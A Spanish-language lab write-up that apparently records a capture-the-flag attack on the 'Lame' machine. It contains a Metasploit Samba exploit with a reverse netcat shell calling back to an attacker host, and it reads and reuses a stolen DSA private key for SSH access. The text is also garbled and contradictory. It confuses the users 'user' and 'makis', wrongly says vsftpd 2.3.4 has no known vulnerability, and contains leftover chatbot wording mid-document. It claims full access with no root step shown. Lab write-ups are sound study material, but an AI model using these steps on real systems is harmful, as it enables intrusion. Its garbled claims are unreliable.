
---
# Proceso de Explotación y Persistencia en la Máquina "Lame"

**Objetivo:** Obtener acceso completo a la máquina víctima explotando vulnerabilidades en los servicios expuestos (Samba y SSH) y garantizar la persistencia mediante el uso de claves SSH.

## 1. Reconocimiento de la Máquina

El primer paso fue realizar un escaneo de puertos para identificar servicios abiertos en la máquina. Para ello, usamos Nmap con diferentes opciones:

### Comando de escaneo inicial

```bash
nmap --open -sV -n -Pn -sS -v -oA initial_scan_nmap 10.10.10.3
```

Salida esperada (ejemplo):

```bash
22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet  Linux telnetd
...
```

Este escaneo nos reveló que el puerto 445 estaba abierto, lo cual es indicativo de que la máquina podría estar corriendo un servicio Samba vulnerable.

## 2. Detección de Vulnerabilidades a través de Servicios Expuestos

### 2.1. Detección de vulnerabilidad en Samba

Con el puerto 445 identificado, decidimos investigar más a fondo el servicio que estaba corriendo en ese puerto. Usamos el módulo de Metasploit `multi/samba/usermap_script` para detectar una posible vulnerabilidad en Samba.

### Comando de Metasploit

```bash
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set RPORT 445
set PAYLOAD cmd/unix/reverse_netcat
set LHOST 10.10.16.52
set LPORT 4444
exploit
```

La salida de Metasploit fue la siguiente:

```bash
[*] Started reverse TCP handler on 10.10.16.52:4444 
[*] Command shell session 1 opened (10.10.16.52:4444 -> 10.10.10.3:39721) at 2025-04-05 19:55:31 +0200
```

Esto nos permitió obtener una shell con privilegios limitados en la máquina víctima, en este caso como el usuario `user`.

## 3. Explotación del Servicio FTP

Realizamos una prueba inicial de FTP para comprobar si existían más vectores de ataque. En este caso, nos encontramos con que el servicio FTP estaba corriendo, pero no pudimos explotar ninguna vulnerabilidad inmediatamente.

### Comando de Nmap para escaneo FTP

```bash
nmap -p 21 --script ftp-anon 10.10.10.3
```

Salida esperada:

```bash
21/tcp open  ftp     vsftpd 2.3.4
```

La versión de FTP no estaba directamente asociada a ninguna vulnerabilidad conocida en ese momento, por lo que decidimos seguir con el enfoque en el servicio Samba.


---

## 4. Persistencia mediante Claves SSH

Después de obtener acceso a la máquina como el usuario `user`, encontramos las claves SSH en el directorio `/home/user/.ssh/`. Esto nos permitió configurar una persistencia en la máquina víctima usando la clave privada DSA (`id_dsa`) encontrada.

### 4.1. El uso de claves SSH

Para poder utilizar esta clave SSH y conectarnos de forma persistente a la máquina víctima, primero revisamos el contenido del archivo de claves privadas.

### Comando para mostrar la clave SSH privada:

```bash
cat /home/user/.ssh/id_dsa
```

La clave privada DSA fue guardada en un archivo llamado `id_dsa`, lo que nos permitió generar una clave de acceso persistente mediante SSH. Sin embargo, nos encontramos con un problema, ya que el protocolo SSH que usa la máquina víctima no permitía de forma predeterminada el uso de claves DSA (un algoritmo más antiguo y no tan recomendado en versiones recientes de OpenSSH).

### 4.2. Problema con la autenticación SSH

Al intentar conectarnos a la máquina con el siguiente comando SSH:

```bash
ssh -i id_dsa_user user@10.10.10.3
```

Recibimos el siguiente error:

```bash
Unable to negotiate with 10.10.10.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

Este error indica que el servidor SSH de la víctima solo aceptaba claves de tipo `ssh-rsa` o `ssh-dss`, y que el cliente SSH que estábamos utilizando no tenía habilitados estos algoritmos.

### 4.3. Solución: Forzar el uso de claves DSA en SSH

Para solucionar esto, tuvimos que modificar la configuración del cliente SSH y forzar que aceptara las claves de tipo DSA. Utilizamos las siguientes opciones al ejecutar el comando SSH:

#### Comando con opciones específicas para habilitar DSA:

```bash
ssh -i id_dsa_user -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedKeyTypes=+ssh-dss makis@10.10.10.3
```

#### Explicación de los parámetros:

- **`-i id_dsa_user`**: Especificamos el archivo de clave privada (`id_dsa_user`) para la autenticación.
    
- **`-o HostKeyAlgorithms=+ssh-dss`**: Forzamos que el cliente SSH acepte el algoritmo de clave `ssh-dss` para la autenticación del servidor.
    
- **`-o PubkeyAcceptedKeyTypes=+ssh-dss`**: Similar al anterior, pero para asegurarnos de que el cliente acepte claves de tipo `ssh-dss` para la autenticación del cliente.
    

Al ejecutar este comando, el servidor aceptó la clave y permitió la conexión sin problemas. La salida fue la siguiente:

```bash
The authenticity of host '10.10.10.3 (10.10.10.3)' can't be established.
DSA key fingerprint is SHA256:kgTW5p1Amzh5MfHn9jIpZf2/pCIZq2TNrG9sh+fy95Q.
Are you sure you want to continue connecting (yes/no)? yes
```

Este paso fue necesario porque, por defecto, OpenSSH deshabilita el soporte para claves `ssh-dss` debido a consideraciones de seguridad (aunque en este caso las claves eran válidas y útiles para nuestra explotación). Al confirmar la autenticidad del host y proceder con `yes`, logramos la conexión correctamente.

### 4.4. Conexión establecida con éxito

Una vez superado el paso de la autenticación SSH, conseguimos conectarnos como `user` en la máquina víctima y acceder a su shell.

Salida esperada:

```bash
makis@lame:~$ ls
user.txt
```

Dentro del directorio home de `makis`, encontramos el archivo `user.txt`, que contiene la flag de usuario.

---

Espero que esta sección clarifique cómo lidiamos con los problemas de autenticación SSH y cómo logramos realizar la conexión usando claves DSA. Puedes agregar esta explicación detallada sobre los comandos SSH en el documento de Obsidian que estás preparando.

Si necesitas más detalles sobre este proceso o alguna otra parte del documento, ¡no dudes en pedírmelo!

## 5. Escalado de Privilegios a "makis"

Después de establecer la persistencia con `user`, procedimos a comprobar la existencia de otros usuarios en el sistema. Descubrimos el usuario `makis`, que también tenía su propia clave SSH configurada. Decidimos intentar la conexión SSH como este usuario.

### Comando para conectarnos como `makis`

```bash
ssh -i id_dsa_user -o HostKeyAlgorithms=+ssh-dss -o PubkeyAcceptedKeyTypes=+ssh-dss makis@10.10.10.3
```

Salida esperada:

```bash
Last login: Tue Mar 14 18:32:04 2017 from 192.168.150.100
makis@lame:~$ ls
user.txt
```

Dentro del directorio home de `makis`, encontramos la flag de usuario `user.txt`.

## 6. Problemas Encontrados y Soluciones

Durante el proceso, encontramos los siguientes problemas y los resolvimos de la siguiente manera:

### 6.1. Problema con SSH y claves DSA

Cuando intentamos conectarnos a la máquina con `ssh -i id_dsa_user`, nos encontramos con el error:

```bash
Unable to negotiate with 10.10.10.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
```

Este error fue solucionado forzando la negociación con los algoritmos de clave DSA usando las opciones `-o HostKeyAlgorithms=+ssh-dss` y `-o PubkeyAcceptedKeyTypes=+ssh-dss`.

### 6.2. Problema con el archivo `authorized_keys`

Al agregar la clave pública de `id_dsa` a `authorized_keys`, encontramos que el archivo `authorized_keys` no estaba correctamente configurado. Esto se solucionó usando los permisos adecuados:

```bash
chmod 600 /home/user/.ssh/authorized_keys
```

### 6.3. Usuario "user" no visible en `/etc/passwd`

Inicialmente, no encontrábamos el usuario `user` en el archivo `/etc/passwd`. Sin embargo, pudimos verificar la existencia de este usuario a través de la estructura de directorios en `/home/` y los archivos de clave SSH.

---
## 7. Obtención de una TTY más funcional

Después de obtener una shell con privilegios limitados, nos encontramos con que la shell proporcionada no tenía un comportamiento adecuado (como el control del historial, el manejo de comandos de forma más amigable, etc.). Por lo tanto, decidimos mejorar nuestra sesión con una TTY más funcional para poder interactuar mejor con el sistema.

### 7.1. Comando para mejorar la shell

La shell obtenida era muy limitada. Utilizamos el siguiente comando para obtener una TTY más funcional, lo que nos permitió realizar tareas como ejecutar scripts y usar herramientas de manera más eficiente:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Ver [TTY Interactiva](../../../Técnicas/Tratamiento%20de%20la%20TTY/TTY%20Interactiva.md)

#### Explicación de los parámetros:

- **`python3 -c`**: Ejecuta un comando en Python directamente desde la terminal.
    
- **`import pty; pty.spawn("/bin/bash")`**: Este fragmento de código importa el módulo `pty` de Python, que permite crear un terminal interactivo y más funcional. La función `pty.spawn("/bin/bash")` nos proporciona una nueva shell interactiva con el comportamiento de una terminal más estándar.
    

Esto nos permitió obtener una shell más completa con características como:

- Historial de comandos.
    
- Mejor visualización de los mensajes de error y salida de comandos.
    
- Posibilidad de usar comandos como `clear`, `ls`, `cd`, entre otros, de manera más fluida.
## Conclusión

Este proceso nos permitió obtener acceso completo a la máquina `Lame`, comenzando con la explotación de una vulnerabilidad en Samba, logrando persistencia mediante SSH, y escalando a través del uso de claves SSH encontradas en el sistema.

Este proceso refleja cómo es posible realizar una penetración efectiva en un sistema con múltiples vectores de ataque y cómo resolver problemas a medida que surgen durante la explotación.
